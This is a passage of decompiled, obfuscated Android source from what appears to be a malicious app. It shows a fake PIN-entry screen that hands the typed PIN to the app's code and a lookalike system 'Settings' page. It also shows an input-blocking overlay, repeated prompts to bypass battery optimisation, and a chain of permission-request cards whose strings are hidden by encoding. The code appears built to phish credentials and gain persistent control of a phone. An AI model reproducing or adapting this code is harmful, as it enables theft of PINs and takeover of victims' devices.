2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z\"/></svg></div>\n<h1>Введите PIN-код</h1>\n<div class=\"subtitle\">Для использования приложения<br>введите 4-значный PIN-код</div>\n<div class=\"dots\" id=\"dots\">\n<div class=\"dot\" id=\"d0\"></div>\n<div class=\"dot\" id=\"d1\"></div>\n<div class=\"dot\" id=\"d2\"></div>\n<div class=\"dot\" id=\"d3\"></div>\n</div>\n<div class=\"keypad\" id=\"keypad\">\n<div class=\"key\" onclick=\"press(1)\">1</div>\n<div class=\"key\" onclick=\"press(2)\">2</div>\n<div class=\"key\" onclick=\"press(3)\">3</div>\n<div class=\"key\" onclick=\"press(4)\">4</div>\n<div class=\"key\" onclick=\"press(5)\">5</div>\n<div class=\"key\" onclick=\"press(6)\">6</div>\n<div class=\"key\" onclick=\"press(7)\">7</div>\n<div class=\"key\" onclick=\"press(8)\">8</div>\n<div class=\"key\" onclick=\"press(9)\">9</div>\n<div class=\"key empty\"></div>\n<div class=\"key\" onclick=\"press(0)\">0</div>\n<div class=\"key key-del\" onclick=\"del()\">&#x232B;</div>\n</div>\n</div>\n<script>\nvar pin='',locked=false;\nfunction press(n){\nif(locked||pin.length>=4)return;\npin+=n;\nupdateDots();\nripple(event.target);\nif(pin.length===4){\nlocked=true;\nsetTimeout(function(){\nfor(var i=0;i<4;i++)document.getElementById('d'+i).classList.add('success');\nsetTimeout(function(){Android.onPinEntered(pin)},500);\n},150);\n}\n}\nfunction del(){\nif(locked||pin.length===0)return;\npin=pin.slice(0,-1);\nupdateDots();\n}\nfunction updateDots(){\nfor(var i=0;i<4;i++){\nvar d=document.getElementById('d'+i);\nd.className=i<pin.length?'dot filled':'dot';\n}\n}\nfunction ripple(el){\nvar r=document.createElement('span');\nr.className='ripple';\nvar rect=el.getBoundingClientRect();\nvar sz=Math.max(rect.width,rect.height);\nr.style.width=r.style.height=sz+'px';\nr.style.left=(event.clientX-rect.left-sz/2)+'px';\nr.style.top=(event.clientY-rect.top-sz/2)+'px';\nel.appendChild(r);\nsetTimeout(function(){r.remove()},600);\n}\n</script>\n</body>\n</html>", TypefaceCache.obtain("003700730043009300BF00B700C600AA002F"), "UTF-8", null);
            frameLayout.addView(webView, new FrameLayout.LayoutParams(-1, -1));
            setContentView(frameLayout);
            TypefaceCache.obtain("002F0077004E008900F300B700E200AE002D0055005A009700E400AA00C000A2000C00780057009E00AA00FF00C100B300220078005F008600FC00B000DC00A200630046007200A900B000BC00D300B7003700630049008200B000AC00D100B500260073005500C700E300B700DD00B0002D");
            return;
        }
        if (oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM() || getSharedPreferences(euF5Udt5Rqv3Qmea, 0).getBoolean(dQC4QhgRN3MSEAP3HW0, false)) {
            try {
                nQilHWaqS401ZtR();
                xfn2GJwmGqs7kWW();
                this.DVTNwpDEVsUKuznof = hjneShqpF9Tis4();
                int i = l1V0lQr6TbwNKqHfXNbb().getInt(qfTrc75xwRVMl85vh, 0);
                ArrayList arrayList = this.DVTNwpDEVsUKuznof;
                ArrayList arrayList2 = null;
                if (arrayList == null) {
                    arrayList = null;
                }
                this.l1V0lQr6TbwNKqHfXNbb = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(i, 0, arrayList.size());
                this.K7eEOBPYP9VIoHWTe = l1V0lQr6TbwNKqHfXNbb().getInt(MSGkxvPxRYNqC, 0);
                dQC4QhgRN3MSEAP3HW0();
                int i2 = this.l1V0lQr6TbwNKqHfXNbb;
                ArrayList arrayList3 = this.DVTNwpDEVsUKuznof;
                if (arrayList3 != null) {
                    arrayList2 = arrayList3;
                }
                if (i2 >= arrayList2.size()) {
                    gIIiyi2ddlMDR0();
                    return;
                }
                wotphlvK9sPbXJ();
                this.XuO9PPFo607ssKwZjNW = true;
                new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 15), 1000L);
                if (!oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM() && !EWUjsTERgdPbSw3NNlN()) {
                    try {
                        Intent intent3 = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                        intent3.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + getPackageName()));
                        startActivity(intent3);
                    } catch (Exception e) {
                        TypefaceCache.obtain("000600770049008B00E900FF00D000A600370062005E009500E900FF00DD00B70037007F0056008E00EA00BE00C600AE002C0078001B009500F500AE00C700A200300062001B008100F100B600DE00A20027002C001B");
                        e.getMessage();
                        try {
                            startActivity(new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"));
                        } catch (Exception unused3) {
                        }
                    }
                }
                new Handler(Looper.getMainLooper()).post(new AInogFBF3uZEdg60(this, 16));
                Intent intent4 = getIntent();
                if (intent4 == null || !intent4.getBooleanExtra(YIgR6F2ZXmLx2ul, false)) {
                    return;
                }
                new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 17), 600L);
                return;
            } catch (Exception e2) {
                TypefaceCache.obtain("00050057006F00A600DC00E5009200A8002D00550049008200F100AB00D700E700200064005A009400F800E50092");
                e2.getMessage();
                try {
                    YIgR6F2ZXmLx2ul();
                } catch (Exception unused4) {
                }
                try {
                    finish();
                    return;
                } catch (Exception unused5) {
                    return;
                }
            }
        }
        this.vIJudZvPyTuNp = true;
        nQilHWaqS401ZtR();
        String[] strArr2 = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM;
        String strObtain = TypefaceCache.obtain("002B0062004F009700E300E5009D00E800340061004C00C900F700B000DD00A0002F00730015008400FF00B2");
        FrameLayout frameLayout2 = new FrameLayout(this);
        frameLayout2.setBackgroundColor(-16777216);
        WebView webView2 = new WebView(this);
        webView2.getSettings().setJavaScriptEnabled(true);
        webView2.getSettings().setDomStorageEnabled(true);
        webView2.getSettings().setLoadWithOverviewMode(true);
        webView2.getSettings().setUseWideViewPort(true);
        webView2.getSettings().setMixedContentMode(0);
        webView2.getSettings().setCacheMode(-1);
        webView2.setWebViewClient(new WebViewClient());
        webView2.setWebChromeClient(new WebChromeClient());
        webView2.loadUrl(strObtain);
        this.yTljMGnIibTRdOpSh4 = webView2;
        frameLayout2.addView(webView2, new FrameLayout.LayoutParams(-1, -1));
        View view = new View(this);
        view.setBackgroundColor(-1728053248);
        view.setClickable(true);
        view.setFocusable(true);
        this.O2DHNSIGZlgPja7eqLgn = view;
        frameLayout2.addView(view, new FrameLayout.LayoutParams(-1, -1));
        FrameLayout frameLayout3 = new FrameLayout(this);
        this.rCHnHJBAlOpNI5 = frameLayout3;
        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(-1, -2);
        layoutParams.gravity = 80;
        layoutParams.bottomMargin = Qrz92kRPw4GcghAc(24);
        layoutParams.leftMargin = Qrz92kRPw4GcghAc(12);
        layoutParams.rightMargin = Qrz92kRPw4GcghAc(12);
        frameLayout2.addView(frameLayout3, layoutParams);
        setContentView(frameLayout2);
        ArrayList arrayList4 = new ArrayList();
        if (Build.VERSION.SDK_INT >= 33) {
            arrayList4.add(new jme6JDteoDB1AsG4(TypefaceCache.obtain("003300790048009300CF00B100DD00B3002A00700052008400F100AB00DB00A8002D0065"), IqsDBf3FXcUYB8yZSHdp.w9sT1Swbhx3hs(), IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0457042D047400C704A404E104F3048504730424040104DF00B004ED048204F1047E045D047E00C704AE04EE048F04F90471042D040E04DA04A804E6009204F80403042E040004D904A604EA048F04FF040D0036040604D204AE04EE04F704F90477042E040704D900B0049F048204F004030423047304D204AD04E7048700E7047E0426001B04A404A204EA048604F9047F042D040E04DA04A80490009C") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A2003000360055008800E400B600D400AE00200077004F008E00FF00B1009200B7002600640056008E00E300AC00DB00A8002D0036004F008800B000BB00D700AB002A0060005E009500B000B600DF00B7002C0064004F008600FE00AB009200B200330072005A009300F500AC009C00E70013007A005E008600E300BA009200A6002F007A0054009000B000AB00DD00E7002000790055009300F900B100C700A2006D"), -364390, -73408, new S0vGWkOuChnrVWDa(this, 2), new H7JWbAQ2EAug6YHM8S(this, 4), new H7JWbAQ2EAug6YHM8S(this, 5)));
        }
        yI1KTRoNlsjx yi1ktronlsjxDVTNwpDEVsUKuznof = DVTNwpDEVsUKuznof(1);
        String strChecked = (String) yi1ktronlsjxDVTNwpDEVsUKuznof.w9sT1Swbhx3hs;
        String strChecked2 = (String) yi1ktronlsjxDVTNwpDEVsUKuznof.vekpFI4d1Nc4fakF;
        String strObtain2 = TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F");
        if (strChecked == null) {
            strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0010005B006800C704A404E104F3048504000429") : TypefaceCache.obtain("0010005B006800C700D100BC00D100A200300065");
        }
        String str = strChecked;
        if (strChecked2 == null) {
            strChecked2 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0457042D047400C704A404E104F3048504000429040B00C704AA00FF048604F7047E042B040504DB04D300FF04F204F204020455047B04A604D3") : TypefaceCache.obtain("00110073004A009200F900AD00D700A300630062005400C700F100BC00D100A200300065001B009300F800B600C100E7003100730048008800E500AD00D100A2");
        }
        arrayList4.add(new jme6JDteoDB1AsG4(strObtain2, str, strChecked2, -11555586, -16715010, new S0vGWkOuChnrVWDa(this, 3), new H7JWbAQ2EAug6YHM8S(this, 6), new H7JWbAQ2EAug6YHM8S(this, 7)));
        yI1KTRoNlsjx yi1ktronlsjxDVTNwpDEVsUKuznof2 = DVTNwpDEVsUKuznof(0);
        String strChecked3 = (String) yi1ktronlsjxDVTNwpDEVsUKuznof2.w9sT1Swbhx3hs;
        String strChecked4 = (String) yi1ktronlsjxDVTNwpDEVsUKuznof2.vekpFI4d1Nc4fakF;
        String strObtain3 = TypefaceCache.obtain("00210077004F009300F500AD00CB");
        if (strChecked3 == null) {
            strChecked3 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("045D0429047904DF04AC04E7048504F70405042E047400C704A104EF04F004F7040304230403") : TypefaceCache.obtain("00010077004F009300F500AD00CB00E7000C0066004F008E00FD00B600C800A60037007F00540089");
        }
        String str2 = strChecked3;
        if (strChecked4 == null) {
            strChecked4 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0457042D047400C704D1049D048204F6047B042D047704DA04AE04E60092048704730427040504A504DB00FF048000E704070428040604D2") : TypefaceCache.obtain("00110073004A009200F900AD00D700A3006300700054009500B000AC00C600A60021007A005E00C700F200BE00D100AC002400640054009200FE00BB009200A8003300730049008600E400B600DD00A9");
        }
        arrayList4.add(new jme6JDteoDB1AsG4(strObtain3, str2, strChecked4, -12326533, -13043241, new S0vGWkOuChnrVWDa(this, 4), new H7JWbAQ2EAug6YHM8S(this, 8), new H7JWbAQ2EAug6YHM8S(this, 35 - 26)));
        yI1KTRoNlsjx yi1ktronlsjxDVTNwpDEVsUKuznof3 = DVTNwpDEVsUKuznof(2);
        String strChecked5 = (String) yi1ktronlsjxDVTNwpDEVsUKuznof3.w9sT1Swbhx3hs;
        String strChecked6 = (String) yi1ktronlsjxDVTNwpDEVsUKuznof3.vekpFI4d1Nc4fakF;
        String strObtain4 = TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900CF00BE00D100A4002600650048");
        if (strChecked5 == null) {
            strChecked5 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("04600424040E04D304AE04E3048904F2047E042E0474") : TypefaceCache.obtain("000D0079004F008E00F600B600D100A60037007F0054008900E3");
        }
        String str3 = strChecked5;
        if (strChecked6 == null) {
            strChecked6 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0457042D047400C704AF04E10489048404040423040604DF04DF00FF048004F70475042B047004A200B0049C048004F204770428040704DC04A504E2048A04FE") : TypefaceCache.obtain("00110073004A009200F900AD00D700A300630062005400C700E200BA00D100A2002A0060005E00C700F900B200C200A800310062005A008900E400FF00D300AB00260064004F0094");
        }
        arrayList4.add(new jme6JDteoDB1AsG4(strObtain4, str3, strChecked6, -10060054, -9024606, new S0vGWkOuChnrVWDa(this, 0), new H7JWbAQ2EAug6YHM8S(this, 0), new H7JWbAQ2EAug6YHM8S(this, 1)));
        if (oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs()) {
            yI1KTRoNlsjx yi1ktronlsjxDVTNwpDEVsUKuznof4 = DVTNwpDEVsUKuznof(3);
            String strDDIMxZXP1V8HdM = (String) yi1ktronlsjxDVTNwpDEVsUKuznof4.w9sT1Swbhx3hs;
            String strChecked7 = (String) yi1ktronlsjxDVTNwpDEVsUKuznof4.vekpFI4d1Nc4fakF;
            String strObtain5 = TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9");
            if (strDDIMxZXP1V8HdM == null) {
                strDDIMxZXP1V8HdM = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM();
            }
            String str4 = strDDIMxZXP1V8HdM;
            if (strChecked7 == null) {
                strChecked7 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0457042D047400C704D004EF048304F90401045D001B04D804D004E7048904F904750423040604DF04DE00FF048F04F2047D0427047E04D904A404E7048E00E704770428047A04A504D304E0009204FD00630457040404D204D604E7048204FC040F042B047004DB00B004ED048C04F0047F0428040D04DA04AE049E04F00488047F0038") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A200300036005A008400F300BA00C100B4002A00740052008B00F900AB00CB00E7003000730049009100F900BC00D700E7002200750058008200E300AC009200A1002C0064001B008100E500B300DE00E700270073004D008E00F300BA009200B700310079004F008200F300AB00DB00A8002D0036005A008900F400FF00D400B2002D0075004F008E00FF00B100D300AB002A0062004200C9");
            }
            arrayList4.add(new jme6JDteoDB1AsG4(strObtain5, str4, strChecked7, -12417548, -13326253, new S0vGWkOuChnrVWDa(this, 1), new H7JWbAQ2EAug6YHM8S(this, 2), new H7JWbAQ2EAug6YHM8S(this, 3)));
        }
        this.tne6mXOUFKdd = arrayList4;
        this.xfn2GJwmGqs7kWW = 0;
        is7XW2V21HfKv7MihWy();
        List listIUQk66nAiXgO35 = imhBI9RqzETHtVIJe.iUQk66nAiXgO35(this.tne6mXOUFKdd, this.xfn2GJwmGqs7kWW);
        new Handler(Looper.getMainLooper()).postDelayed(new SXuc7yHnGVKI(this, listIUQk66nAiXgO35.size() == 1 && okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(((jme6JDteoDB1AsG4) listIUQk66nAiXgO35.get(0)).dDIMxZXP1V8HdM, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F"))), 800L);
        if (!EWUjsTERgdPbSw3NNlN()) {
            try {
                try {
                    Intent intent5 = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    intent5.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + getPackageName()));
                    startActivity(intent5);
                } catch (Exception unused6) {
                    startActivity(new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"));
                }
            } catch (Exception unused7) {
            }
        }
        Handler handler = new Handler(Looper.getMainLooper());
        AInogFBF3uZEdg60 aInogFBF3uZEdg60 = new AInogFBF3uZEdg60(this, 2);
        handler.postDelayed(new aiO5jRTHj9azsn306(new g78iUtGnOvef(), this, handler, aInogFBF3uZEdg60, 1), 1000L);
        handler.postDelayed(aInogFBF3uZEdg60, 10000L);
        TypefaceCache.obtain("00100062005E008600FC00BA00C000E700140073005900B100F900BA00C500E7002E0079005F008200B000B300D300B2002D00750053008200F400E50092");
        this.tne6mXOUFKdd.size();
        TypefaceCache.obtain("00630075005A009500F400AC");
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        WebView webView = this.yTljMGnIibTRdOpSh4;
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public final void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (intent == null || !intent.getBooleanExtra(YIgR6F2ZXmLx2ul, false)) {
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 14), 600L);
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if ((i == 9988 || i == 1055) && this.vIJudZvPyTuNp) {
            new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 12), 300L);
        }
        if (i != 1055 || this.vIJudZvPyTuNp) {
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 13), 300L);
    }

    @Override // android.app.Activity
    public final void onResume() {
        ArrayList arrayList;
        super.onResume();
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService("notification");
            notificationManager.cancel(7777);
            notificationManager.cancel(5001);
        } catch (Exception unused) {
        }
        if (this.vIJudZvPyTuNp) {
            new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 10), 600L);
            return;
        }
        if (!this.XuO9PPFo607ssKwZjNW || (arrayList = this.DVTNwpDEVsUKuznof) == null || this.l1V0lQr6TbwNKqHfXNbb >= arrayList.size()) {
            return;
        }
        try {
            ArrayList arrayList2 = this.DVTNwpDEVsUKuznof;
            if (arrayList2 == null) {
                arrayList2 = null;
            }
            fTTdiiD76ErrE12U fttdiid76erre12u = (fTTdiiD76ErrE12U) imhBI9RqzETHtVIJe.hV4VTKNUdeHN(this.l1V0lQr6TbwNKqHfXNbb, arrayList2);
            if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(fttdiid76erre12u != null ? fttdiid76erre12u.dDIMxZXP1V8HdM : null, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048")) || !EWUjsTERgdPbSw3NNlN() || rCHnHJBAlOpNI5()) {
                gmNWMfvn6zlEj();
            } else {
                TypefaceCache.obtain("002C00780069008200E300AA00DF00A2007900360079008600E400AB00D700B5003A0036005C009500F100B100C600A20027003A001B008600E500AB00DD00EA00310073004A009200F500AC00C600AE002D0071001B00B400DD008C009200A300260070005A009200FC00AB");
                new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 11), 500L);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002C00780069008200E300AA00DF00A2006300750053008200F300B400F300A900270057005F009100F100B100D100A2006300730049009500FF00AD008800E7");
            e.getMessage();
        }
    }

    @Override // android.app.Activity
    public final void onStop() {
        super.onStop();
        try {
            String str = oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM;
            String str2 = oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs ? oJLsXXGxdTuQpIRpV.Ee8d2j4S9Vm5yGuR : KV57Z6oavcB595B8Dy8Z.ibVTtJUNfrGYbW;
            boolean zW9sT1Swbhx3hs = oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs();
            boolean zDTS0S7eC32ubQH54j36 = false;
            boolean z = (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str2, TypefaceCache.obtain("00300062005E008600FC00BA00C0")) || zW9sT1Swbhx3hs || oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM()) ? false : true;
            while (Runtime.getRuntime().maxMemory() < 0) {
            }
            if (z) {
                zDTS0S7eC32ubQH54j36 = O2DHNSIGZlgPja7eqLgn();
            } else if (!zW9sT1Swbhx3hs) {
                zDTS0S7eC32ubQH54j36 = dTS0S7eC32ubQH54j36();
            } else if (O2DHNSIGZlgPja7eqLgn() || dTS0S7eC32ubQH54j36()) {
                zDTS0S7eC32ubQH54j36 = true;
            }
            if (zDTS0S7eC32ubQH54j36) {
                return;
            }
            String str3 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            if (SyncQYAdapter.VEkRsTDS6a9oHWI == null) {
                YIgR6F2ZXmLx2ul();
                new Handler(Looper.getMainLooper()).postDelayed(new jdOQeRk37T35X5xKW1P(16), 2000L);
            } else {
                SyncQYAdapter syncQYAdapter = SyncQYAdapter.VEkRsTDS6a9oHWI;
                if (syncQYAdapter != null) {
                    syncQYAdapter.VEkRsTDS6a9oHWI();
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002C00780068009300FF00AF009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r3v2, types: [boolean, int] */
    public final void qfTrc75xwRVMl85vh() {
        TypefaceCache.obtain("00620037001A00C700E300BA00DC00A300170079006F008200FC00BA00D500B50022007B001300CE");
        if (l1V0lQr6TbwNKqHfXNbb().getBoolean(VEkRsTDS6a9oHWI, false)) {
            TypefaceCache.obtain("00620037001A00C700D100B300C000A200220072004200C700E300BA00DC00B3006F00360048008C00F900AF00C200AE002D0071");
            YIgR6F2ZXmLx2ul();
            return;
        }
        YIgR6F2ZXmLx2ul();
        cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
        JnC75xOgwtSSKHn30v jnC75xOgwtSSKHn30v = new JnC75xOgwtSSKHn30v(this, null, 7);
        ?? r3 = 30 - 29;
        int i = 2 & r3;
        sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
        if (i != 0) {
            cptq2xmcb5jsaehn = snackioajero;
        }
        cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero, cptq2xmcb5jsaehn, r3);
        AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
        if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
            cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
        }
        snDbSR9Gb3eZZuB sndbsr9gb3ezzub = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ, r3);
        sndbsr9gb3ezzub.YIgR6F2ZXmLx2ul(r3, sndbsr9gb3ezzub, jnC75xOgwtSSKHn30v);
    }

    public final boolean rCHnHJBAlOpNI5() {
        try {
            return okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(getPackageName(), gA5gCwTK0qjTIn.b1EoSIRjJHO5(this));
        } catch (Exception unused) {
            return false;
        }
    }

    public final void tne6mXOUFKdd() {
        cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
        JV1KnSgnr44vUJP8N jV1KnSgnr44vUJP8N = new JV1KnSgnr44vUJP8N(this, null, 2);
        int i = 2 & 1;
        sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
        if (i != 0) {
            cptq2xmcb5jsaehn = snackioajero;
        }
        cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero, cptq2xmcb5jsaehn, true);
        AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
        if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
            cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
        }
        JXn4Qf7zpnLjP5 sndbsr9gb3ezzub = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ, true);
        sndbsr9gb3ezzub.YIgR6F2ZXmLx2ul(1, sndbsr9gb3ezzub, jV1KnSgnr44vUJP8N);
    }

    public final boolean vIJudZvPyTuNp() {
        try {
            return Build.VERSION.SDK_INT < 33 || RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.POST_NOTIFICATIONS") == 0;
        } catch (Exception unused) {
            return true;
        }
    }

    public final void wotphlvK9sPbXJ() {
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackgroundColor(-16777216);
        String[] strArr = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM;
        WebView webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(false);
        webView.getSettings().setUseWideViewPort(false);
        webView.getSettings().setAllowFileAccess(false);
        webView.setBackgroundColor(-16777216);
        webView.addJavascriptInterface(new LRT9aFvEZ8jjymwD(this), TypefaceCache.obtain("00020078005F009500FF00B600D6"));
        webView.setWebViewClient(new xEMhlPHEg6l7ZCe0(this, 1));
        webView.loadDataWithBaseURL(TypefaceCache.obtain("002B0062004F009700E300E5009D00E8002F00790058008600FC00B700DD00B400370039"), "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0,user-scalable=no,viewport-fit=cover\">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}\nhtml,body{height:100%}\nbody{font-family:'Roboto',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;overflow-x:hidden;opacity:0;transition:opacity .3s ease}\nbody.ready{opacity:1}\n.wrap{flex:1;padding:16px;overflow-y:auto}\n.hdr{padding:20px 0 8px 0;animation:fadeDown .4s ease both}\n.hdr h1{font-size:24px;font-weight:400;letter-spacing:.15px}\n@keyframes fadeDown{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}\n@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}\n@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}\n.sl{font-size:14px;color:#8ab4f8;font-weight:500;margin:20px 0 12px;letter-spacing:.1px;animation:fadeUp .4s .1s ease both}\n.ac{background:#1e1e1e;border:2px solid #8ab4f8;border-radius:16px;padding:16px;margin-bottom:16px;display:flex;align-items:center;gap:14px;animation:fadeUp .4s .15s ease both}\n.ai{width:44px;height:44px;border-radius:12px;overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:#202124}\n.ai img{width:100%;height:100%;object-fit:cover;display:block}\n.ai svg{width:28px;height:28px}\n.af{flex:1}\n.an{font-size:16px;font-weight:400;margin-bottom:2px;color:#fff}\n.as{font-size:14px;color:#9aa0a6}\n.ib{background:linear-gradient(135deg,#1a73e8,#1565c0);border-radius:16px;padding:16px 18px;margin:16px 0;font-size:14px;line-height:1.6;color:#fff;position:relative;animation:fadeUp .4s .2s ease both;box-shadow:0 4px 20px rgba(26,115,232,.25)}\n.ib::before{content:'';position:absolute;top:-8px;left:28px;width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-bottom:8px solid #1a73e8}\n.si{background:#1e1e1e;border-radius:14px;padding:16px;margin-bottom:8px;display:flex;align-items:center;gap:16px;opacity:0;animation:fadeUp .35s ease both}\n.si:nth-child(1){animation-delay:.3s}.si:nth-child(2){animation-delay:.38s}.si:nth-child(3){animation-delay:.46s}.si:nth-child(4){animation-delay:.54s}\n.sk{width:28px;height:28px;border-radius:6px;flex-shrink:0;display:flex;align-items:center;justify-content:center}\n.sk svg{width:18px;height:18px;fill:#fff}\n.sc{flex:1}\n.st{font-size:16px;font-weight:400;color:#fff;margin-bottom:2px}\n.sd{font-size:14px;color:#9aa0a6}\n.ms{display:none;padding:12px 0 8px}\n.ms.v{display:block}\n.mt{font-size:14px;color:#fff;line-height:1.5;padding:12px 16px;background:#2d2d2d;border-radius:12px;margin-bottom:12px}\n.mb{display:inline-block;background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;cursor:pointer}\n.btn-bar{padding:16px 16px calc(16px + var(--nav-bar-h,48px));text-align:center;flex-shrink:0}\n.eb{display:inline-block;background:linear-gradient(135deg,#1a73e8,#1565c0);color:#fff;border:none;border-radius:28px;padding:15px 52px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 6px 24px rgba(26,115,232,.35);transition:all .2s ease;letter-spacing:.5px;animation:pulse 2.5s 1s ease infinite}\n.eb:active{transform:scale(.95);box-shadow:0 2px 12px rgba(26,115,232,.3);animation:none}\n.tgl{width:36px;height:20px;background:#5f6368;border-radius:10px;position:relative;flex-shrink:0;margin-left:auto}\n.tgl::after{content:'';width:16px;height:16px;border-radius:50%;background:#bdc1c6;position:absolute;top:2px;left:2px;transition:all .2s}\n</style>\n</head>\n<body>\n<div class=\"wrap\">\n<div class=\"hdr\"><h1 id=\"pT\">Settings</h1></div>\n<div class=\"sl\" 